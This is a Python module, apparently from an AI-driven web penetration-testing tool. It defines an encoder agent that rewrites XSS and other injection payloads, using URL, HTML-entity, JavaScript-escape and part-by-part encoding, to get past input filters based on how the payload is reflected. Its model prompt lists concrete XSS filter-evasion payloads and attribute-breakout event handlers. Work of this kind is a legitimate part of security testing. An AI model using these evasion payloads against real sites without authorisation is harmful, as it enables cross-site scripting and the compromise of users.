"""
Encoder Agent - Iteratively encodes payloads based on reflection tracking
Works with Observer to detect how payloads are reflected and applies appropriate encoding
"""
from langchain_core.messages import SystemMessage, HumanMessage
from states.agent_state import AgentState
from utils.ansi import MAGENTA, GREEN, RED, YELLOW, CYAN, RESET
from utils.reasoning import ReasoningDisplay
import json
import base64
import urllib.parse
import re
from typing import List, Dict, Tuple


def encoder_node(state: AgentState, orch=None):
    """
    Encoder agent that:
    1. Receives reflection feedback from observer (is payload reflected? how?)
    2. Analyzes encoding needs based on reflection context
    3. Iteratively encodes payload parts (for stored XSS, encodes each part separately)
    4. For URL parameters: tries URL encoding variations
    5. For stored contexts: iterates over payload parts with progressive encoding
    6. Tracks encoding history to avoid repeating same encoding
    7. Returns encoded payload to injector
    """
    
    print(f"{MAGENTA}[>][encoder]{RESET} Analyzing reflection and encoding payload...", flush=True)
    
    # Get context from state
    observation = state.get('observation', {})
    injection_plan = state.get('injection_plan', {})
    original_payload = injection_plan.get('payload_selected', '')
    test_category = state.get('checklist_directive', {}).get('next_test', {}).get('category', 'Unknown')
    parameter = state.get('checklist_directive', {}).get('next_test', {}).get('parameter', 'q')
    
    # Get reflection context from observer
    reflection_context = state.get('reflection_context', {})
    is_reflected = reflection_context.get('is_reflected', False)
    reflection_location = reflection_context.get('location', 'none')  # url, html, js, attribute, stored
    is_stored = reflection_context.get('is_stored', False)
    
    # Get encoding history to avoid repeating
    encoding_history = state.get('encoding_history', [])
    encoder_attempts = state.get('encoder_attempts', 0)
    max_encoder_attempts = 3  # Maximum encoding iterations
    
    print(f"{MAGENTA}[*][encoder]{RESET} Reflection: {is_reflected} | Location: {reflection_location} | Stored: {is_stored}", flush=True)
    print(f"{MAGENTA}[*][encoder]{RESET} Encoder attempt {encoder_attempts + 1}/{max_encoder_attempts}", flush=True)
    
    # If max attempts reached, signal to move on
    if encoder_attempts >= max_encoder_attempts:
        print(f"{YELLOW}[!][encoder]{RESET} Max encoding attempts reached, moving to next test", flush=True)
        return {
            'encoder': 'Max encoding attempts reached',
            'encoded_payloads': [],
            'encoding_complete': True,
            'encoder_attempts': encoder_attempts
        }
    
    # Build encoding strategy prompt
    prompt = f"""You are an Advanced Payload Encoding Specialist analyzing reflection patterns.

ORIGINAL PAYLOAD:
{original_payload}

TEST CATEGORY: {test_category}
PARAMETER: {parameter}

REFLECTION ANALYSIS (from Observer):
- Payload Reflected: {is_reflected}
- Reflection Location: {reflection_location}
- Is Stored: {is_stored}
- Raw Reflection Data: {reflection_context.get('raw_reflection', 'N/A')[:500]}

ENCODING HISTORY (already tried):
{json.dumps(encoding_history, indent=2)}

CURRENT ATTEMPT: {encoder_attempts + 1} of {max_encoder_attempts}

ENCODING STRATEGY BY REFLECTION CONTEXT:

1. URL PARAMETER REFLECTION (reflection_location='url'):
   - Attempt 1: Single URL encode: {urllib.parse.quote(original_payload)}
   - Attempt 2: Double URL encode: {urllib.parse.quote(urllib.parse.quote(original_payload))}
   - Attempt 3: Mixed encoding (alternate chars): %3Cs%63%72%69pt%3E

2. HTML CONTEXT REFLECTION (reflection_location='html'):
   - Attempt 1: HTML entity encoding (decimal): &#60;script&#62;alert(1)&#60;/script&#62;
   - Attempt 2: HTML entity encoding (hex): &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
   - Attempt 3: Mixed HTML entities: &#60;script>alert(1)</script>

3. JAVASCRIPT CONTEXT (reflection_location='js'):
   - Attempt 1: Unicode escape: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e
   - Attempt 2: Hex escape: \\x3cscript\\x3ealert(1)\\x3c/script\\x3e
   - Attempt 3: Octal escape: \\74script\\76alert(1)\\74/script\\76

4. ATTRIBUTE CONTEXT (reflection_location='attribute'):
   - Attempt 1: Break out of attribute: " onload="alert(1)
   - Attempt 2: Event handler injection: " onerror="alert(1)
   - Attempt 3: Style-based XSS: " style="x:expression(alert(1))

5. STORED CONTEXT (is_stored=True):
   ITERATIVE PART-BY-PART ENCODING:
   For payload like "<script>alert(1)</script>":
   - Attempt 1: Encode opening tag: %3Cscript>alert(1)</script>
   - Attempt 2: Encode function: <script>%61%6c%65%72%74(1)</script>
   - Attempt 3: Encode closing tag: <script>alert(1)%3C/script%3E
   - Attempt 4: Encode all special chars: %3Cscript%3Ealert%281%29%3C%2Fscript%3E

6. NO REFLECTION (is_reflected=False):
   - Blind encoding attempts
   - Try time-based detection for SQLi
   - Try out-of-band for SSRF/XXE

ENCODING TECHNIQUES TO APPLY:

URL Encoding:
```python
single = urllib.parse.quote(payload)
double = urllib.parse.quote(urllib.parse.quote(payload))
mixed = ''.join(urllib.parse.quote(c) if i % 2 else c for i, c in enumerate(payload))
```

HTML Entity Encoding:
```python
decimal = ''.join(f'&#{ord(c)};' for c in payload)
hex_ent = ''.join(f'&#x{ord(c):x};' for c in payload)
```

Unicode Escape:
```python
unicode_esc = ''.join(f'\\u{ord(c):04x}' for c in payload)
```

Base64 (for command injection):
```python
b64 = base64.b64encode(payload.encode()).decode()
```

ITERATIVE PART ENCODING (for stored XSS):
If stored=True, encode ONLY one part at a time:
```python
# Payload: <script>alert(1)</script>
parts = [
    ('<', 'opening bracket'),
    ('script', 'tag name'),
    ('>', 'closing bracket'),
    ('alert', 'function name'),
    ('(1)', 'arguments'),
    ('</', 'closing tag start'),
    ('script>', 'closing tag end')
]

# Attempt 1: encode part 0
encoded = '%3C' + 'script>alert(1)</script>'

# Attempt 2: encode part 1 (keep previous encodings)
encoded = '%3C' + '%73%63%72%69%70%74' + '>alert(1)</script>'

# Attempt 3: encode part 2
encoded = '%3C%73%63%72%69%70%74%3E' + 'alert(1)</script>'
```

YOUR TASK:
1. Analyze why previous encoding attempts failed (check encoding_history)
2. Select appropriate encoding technique based on reflection context
3. If stored=True, encode incrementally (one more part than last attempt)
4. If URL parameter, try next URL encoding level
5. Generate encoded payload avoiding previous attempts
6. Track which encoding applied for next iteration

OUTPUT FORMAT (JSON):
{{
  "encoded_payload": "the encoded payload string",
  "encoding_technique": "URL single|URL double|HTML decimal|HTML hex|Unicode|Base64|Iterative part X",
  "encoding_details": {{
    "method": "url_encode|html_entity|unicode_escape|base64|mixed",
    "level": "single|double|triple",
    "parts_encoded": ["list of payload parts that were encoded"],
    "reasoning": "why this encoding chosen"
  }},
  "next_iteration_plan": "what to encode next if this fails",
  "confidence": "high|medium|low",
  "expected_bypass": "what filter this should bypass"
}}

CRITICAL: Your response MUST be ONLY valid JSON. Do not include explanations before or after the JSON.
Start your response with {{ and end with }}.

Generate the encoded payload based on reflection context.
"""
    
    messages = [
        SystemMessage(content=prompt),
        HumanMessage(content=f"Encode payload for {test_category} based on reflection: {reflection_location}. Attempt {encoder_attempts + 1}.")
    ]
    
    display = ReasoningDisplay("encoder", MAGENTA)
    
    try:
        print(f"\n[>] Executing tools...", flush=True)
        print(f"  1. encoder", flush=True)
        print(f"     • Encoding payload (attempt {encoder_attempts + 1})", flush=True)
        print(f"     [~] Running...", flush=True)
        
        response = orch.model.invoke(messages) if orch else None
        
        print(f"     ✓ Tools completed\n", flush=True)
        print(f"[*] Analyzing results and planning next action...\n", flush=True)
        
        if response:
            content = response.content
            
            # Extract encoding result
            try:
                # Try multiple JSON extraction methods
                if '```json' in content:
                    json_start = content.find('```json') + 7
                    json_end = content.find('```', json_start)
                    json_str = content[json_start:json_end].strip()
                elif '```' in content:
                    json_start = content.find('```') + 3
                    json_end = content.find('```', json_start)
                    json_str = content[json_start:json_end].strip()
                elif '{' in content and '}' in content:
                    json_start = content.find('{')
                    json_end = content.rfind('}') + 1
                    json_str = content[json_start:json_end].strip()
                else:
                    json_str = content.strip()
                
                encoding_result = json.loads(json_str)
                encoded_payload = encoding_result.get('encoded_payload', '')
                encoding_technique = encoding_result.get('encoding_technique', 'unknown')
                
                print(f"{GREEN}[+][encoder]{RESET} Encoded using: {encoding_technique}", flush=True)
                print(f"{MAGENTA}    Original: {original_payload[:50]}...{RESET}", flush=True)
                print(f"{GREEN}    Encoded:  {encoded_payload[:50]}...{RESET}", flush=True)
                
                # Update encoding history
                encoding_history.append({
                    'attempt': encoder_attempts + 1,
                    'technique': encoding_technique,
                    'payload': encoded_payload,
                    'reflection_context': reflection_location
                })
                
            except json.JSONDecodeError:
                print(f"{YELLOW}[!][encoder]{RESET} Could not parse JSON, using fallback encoding", flush=True)
                # Fallback: apply basic encoding based on reflection context
                encoding_result = apply_fallback_encoding(
                    original_payload, 
                    reflection_location, 
                    is_stored,
                    encoder_attempts,
                    test_category
                )
                encoded_payload = encoding_result.get('encoded_payload', original_payload)
                encoding_technique = encoding_result.get('encoding_technique', 'fallback')
                
                encoding_history.append({
                    'attempt': encoder_attempts + 1,
                    'technique': encoding_technique,
                    'payload': encoded_payload,
                    'reflection_context': reflection_location
                })
                
        else:
            content = "Encoder unavailable"
            encoding_result = {}
            encoded_payload = original_payload
            encoding_technique = 'none'
            
    except Exception as e:
        print(f"{RED}[-][encoder]{RESET} Error: {e}", flush=True)
        content = f"Encoder error: {e}"
        encoding_result = {}
        encoded_payload = original_payload
        encoding_technique = 'error'
    
    return {
        'encoder': content,
        'encoded_payload': encoded_payload,
        'encoding_technique': encoding_technique,
        'encoding_result': encoding_result,
        'encoding_history': encoding_history,
        'encoder_attempts': encoder_attempts + 1,
        'encoding_complete': False
    }


def apply_fallback_encoding(
    payload: str, 
    reflection_location: str, 
    is_stored: bool,
    attempt: int,
    test_category: str
) -> Dict:
    """
    Fallback encoding when LLM parsing fails
    Applies systematic encoding based on context
    """
    
    encoded = payload
    technique = 'none'
    details = {}
    
    # URL parameter context
    if reflection_location == 'url':
        if attempt == 0:
            # Single URL encode
            encoded = urllib.parse.quote(payload)
            technique = 'URL single encode'
        elif attempt == 1:
            # Double URL encode
            encoded = urllib.parse.quote(urllib.parse.quote(payload))
            technique = 'URL double encode'
        elif attempt == 2:
            # Mixed encoding (alternate characters)
            encoded = ''.join(
                urllib.parse.quote(c) if i % 2 == 0 else c 
                for i, c in enumerate(payload)
            )
            technique = 'URL mixed encode'
        details = {
            'method': 'url_encode',
            'level': 'single' if attempt == 0 else 'double' if attempt == 1 else 'mixed',
            'parts_encoded': ['entire payload'],
            'reasoning': f'URL encoding level {attempt + 1} for URL parameter reflection'
        }
    
    # HTML context
    elif reflection_location == 'html':
        if attempt == 0:
            # HTML decimal entities
            encoded = ''.join(f'&#{ord(c)};' for c in payload)
            technique = 'HTML decimal entities'
        elif attempt == 1:
            # HTML hex entities
            encoded = ''.join(f'&#x{ord(c):x};' for c in payload)
            technique = 'HTML hex entities'
        elif attempt == 2:
            # Mixed: only encode special chars
            special_chars = '<>"\'/&'
            encoded = ''.join(
                f'&#x{ord(c):x};' if c in special_chars else c
                for c in payload
            )
            technique = 'HTML mixed entities'
        details = {
            'method': 'html_entity',
            'level': 'decimal' if attempt == 0 else 'hex' if attempt == 1 else 'mixed',
            'parts_encoded': ['special characters'],
            'reasoning': f'HTML entity encoding level {attempt + 1} for HTML context'
        }
    
    # Stored context - iterative part encoding
    elif is_stored:
        # For stored XSS, encode progressively more parts
        if test_category == 'XSS':
            parts = split_xss_payload(payload)
            encode_count = min(attempt + 1, len(parts))
            
            encoded_parts = []
            for i, part in enumerate(parts):
                if i < encode_count:
                    # URL encode this part
                    encoded_parts.append(urllib.parse.quote(part))
                else:
                    encoded_parts.append(part)
            
            encoded = ''.join(encoded_parts)
            technique = f'Iterative part encoding ({encode_count}/{len(parts)} parts)'
            details = {
                'method': 'iterative_part_encoding',
                'level': f'part_{encode_count}',
                'parts_encoded': parts[:encode_count],
                'reasoning': f'Encoding {encode_count} parts for stored XSS iteration'
            }
        else:
            # For other stored injection types, use URL encoding
            encoded = urllib.parse.quote(payload)
            technique = 'URL encode for stored'
            details = {
                'method': 'url_encode',
                'level': 'single',
                'parts_encoded': ['entire payload'],
                'reasoning': 'URL encoding for stored injection'
            }
    
    # JavaScript context
    elif reflection_location == 'js':
        if attempt == 0:
            # Unicode escape
            encoded = ''.join(f'\\u{ord(c):04x}' for c in payload)
            technique = 'Unicode escape'
        elif attempt == 1:
            # Hex escape
            encoded = ''.join(f'\\x{ord(c):02x}' for c in payload)
            technique = 'Hex escape'
        elif attempt == 2:
            # Mixed escape
            encoded = ''.join(
                f'\\u{ord(c):04x}' if i % 2 == 0 else c
                for i, c in enumerate(payload)
            )
            technique = 'Mixed escape'
        details = {
            'method': 'javascript_escape',
            'level': 'unicode' if attempt == 0 else 'hex' if attempt == 1 else 'mixed',
            'parts_encoded': ['entire payload'],
            'reasoning': f'JavaScript escape level {attempt + 1}'
        }
    
    # Default: URL encode
    else:
        encoded = urllib.parse.quote(payload)
        technique = 'Default URL encode'
        details = {
            'method': 'url_encode',
            'level': 'single',
            'parts_encoded': ['entire payload'],
            'reasoning': 'Default encoding for unknown reflection context'
        }
    
    return {
        'encoded_payload': encoded,
        'encoding_technique': technique,
        'encoding_details': details,
        'next_iteration_plan': 'Try next encoding level or move to next test',
        'confidence': 'medium',
        'expected_bypass': 'Basic input filtering and sanitization'
    }


def split_xss_payload(payload: str) -> List[str]:
    """
    Split XSS payload into logical parts for iterative encoding
    Example: '<script>alert(1)</script>' -> ['<', 'script', '>', 'alert(1)', '</', 'script', '>']
    """
    import re
    
    # Pattern to split while preserving delimiters
    pattern = r'(<|>|</|\(|\)|;|"|\s+)'
    parts = re.split(pattern, payload)
    
    # Filter out empty strings
    parts = [p for p in parts if p.strip()]
    
    return parts


def analyze_reflection(response_text: str, payload: str) -> Dict:
    """
    Helper function to analyze how payload is reflected in response
    Can be called by observer to populate reflection_context
    """
    
    reflection_data = {
        'is_reflected': False,
        'location': 'none',
        'is_stored': False,
        'raw_reflection': '',
        'encoded_in_response': False
    }
    
    # Check if payload appears in response
    if payload in response_text:
        reflection_data['is_reflected'] = True
        reflection_data['raw_reflection'] = response_text[max(0, response_text.find(payload) - 50):response_text.find(payload) + 100]
        
        # Determine reflection location
        # Check URL
        if 'http://' in response_text or 'https://' in response_text:
            if payload in response_text[response_text.find('http'):]:
                reflection_data['location'] = 'url'
        
        # Check HTML context
        if '<' in response_text and '>' in response_text:
            # Find payload position relative to HTML tags
            payload_pos = response_text.find(payload)
            before = response_text[max(0, payload_pos - 100):payload_pos]
            after = response_text[payload_pos:min(len(response_text), payload_pos + 100)]
            
            if '<script' in before.lower() or '</script>' in after.lower():
                reflection_data['location'] = 'js'
            elif re.search(r'<\w+[^>]*' + re.escape(payload), response_text):
                reflection_data['location'] = 'attribute'
            else:
                reflection_data['location'] = 'html'
        
    # Check if payload is encoded in response
    url_encoded = urllib.parse.quote(payload)
    html_encoded = ''.join(f'&#x{ord(c):x};' for c in payload)
    
    if url_encoded in response_text or html_encoded in response_text:
        reflection_data['encoded_in_response'] = True
        reflection_data['is_reflected'] = True
    
    return reflection_data
